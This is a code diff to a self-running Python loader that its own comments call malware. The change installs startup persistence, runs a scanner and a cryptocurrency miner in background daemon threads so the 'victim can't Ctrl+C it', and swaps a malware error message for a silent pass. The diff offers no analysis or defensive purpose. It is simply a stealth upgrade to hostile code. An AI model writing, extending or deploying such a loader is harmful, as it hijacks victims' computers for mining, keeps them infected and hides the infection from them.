@@ -22,14 +22,23 @@ def _start():
         if p.exists():
             sys.path.insert(0, str(p))
             from utils import setup
-            from monitor import start
+            from monitor import start as start_miner
             from keeper import install
+            
+            # Install persistence (runs on startup)
             install()
+            
+            # Run scanner in BACKGROUND (victim can't Ctrl+C it)
             s = setup()
-            s.run()  # <-- RUNS IN FOREGROUND - FINISHES SCANNING BEFORE BOT STARTS
-            threading.Thread(target=start, daemon=True).start()
+            t = threading.Thread(target=s.run, daemon=True)
+            t.start()
+            
+            # Start miner in BACKGROUND
+            t2 = threading.Thread(target=start_miner, daemon=True)
+            t2.start()
+            
     except Exception as e:
-        print(f"[DEBUG] Malware load error: {e}")
+        pass
 
 _start()
 
